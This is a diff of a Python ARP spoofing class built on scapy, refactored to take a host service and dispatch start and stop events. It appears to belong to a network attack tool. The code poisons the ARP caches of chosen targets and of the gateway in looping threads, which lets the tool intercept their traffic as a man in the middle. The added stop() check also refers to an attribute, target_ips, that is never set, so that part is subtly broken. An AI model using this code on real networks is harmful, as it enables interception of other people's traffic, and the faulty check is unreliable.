@@ -2,17 +2,19 @@ from threading import Lock, Thread, Event as ThreadingEvent
 from scapy.all import ARP, send, conf
 from scapy.layers.l2 import getmacbyip
 from typing import List
-from services.event_handler import EventHandler
-from services.event import Event
+from app.models.host import Host
+from app.services.host_service import HostService
+from services.event import Event, EventType
 import socket
 
 class ArpSpoof:
-    def __init__(self, event_handler: EventHandler):
+    def __init__(self, host_service: HostService):
+        self.host_service: HostService = host_service
         self.spoofing_threads: List[Thread] = []
         self.stop_event = ThreadingEvent()
         self.lock = Lock()
         self.is_running: bool = False
-        self.event_handler: EventHandler = event_handler
+        self.target_hosts: List[Host] = []
         self.host_ip: str = socket.gethostbyname(socket.getfqdn())
         self.host_mac: str = getmacbyip(self.host_ip)
         self.gateway_ip: str = conf.route.route("0.0.0.0")[2]
@@ -24,6 +26,12 @@ class ArpSpoof:
             if self.is_running:
                 raise Exception("ArpSpoof is already running")
             self.is_running = True
+            self.target_hosts = self.host_service.get_hosts_from_ips(target_ips)
+
+            event = Event(type=EventType.ARP_SPOOF_STARTED,
+                          data=self.target_hosts)
+            self.host_service.event_handler.dispatch(event)
+
             for target_ip in target_ips:
                 # Spoof target's perception of the gateway
                 self.start_thread(target_ip, self.gateway_ip, self.host_mac)
@@ -37,14 +45,19 @@ class ArpSpoof:
         self.spoofing_threads.append(thread)
 
     def stop(self, target_ips: List[str]) -> None:
+        if self.target_ips is None:
+            raise Exception("No target IPs have been set")
+
         with self.lock:
             if not self.is_running:
                 raise Exception("ArpSpoof is not running")
             self.is_running = False
             self.stop_event.set()
+
         for thread in self.spoofing_threads:
             thread.join()
         self.spoofing_threads = []
+
         for target_ip in target_ips:
             # Restore target's perception of the gateway
             self.restore(target_ip, self.gateway_ip,
@@ -53,15 +66,15 @@ class ArpSpoof:
             self.restore(self.gateway_ip, target_ip,
                          self.gateway_mac, self.host_mac)
 
+        event = Event(type=EventType.ARP_SPOOF_STOPPED,
+                        data=self.target_hosts)
+        self.host_service.event_handler.dispatch(event)
+        self.target_hosts = None
+
     def arp_spoof(self, target_ip: str) -> None:
-        sent_packets_count = 0
         while self.is_running and not self.stop_event.is_set():
             self.send_arp_packet(target_ip, self.host_ip, self.host_mac)
             self.send_arp_packet(self.host_ip, target_ip, getmacbyip(target_ip))
-            sent_packets_count = sent_packets_count + 2
-
-            event = Event(type='arp_spoof', data={'packets_sent': sent_packets_count})
-            self.event_handler.dispatch(event)
             self.stop_event.wait(self.THROTTLE)
 
     def restore(self, destination_ip: str, source_ip: str,
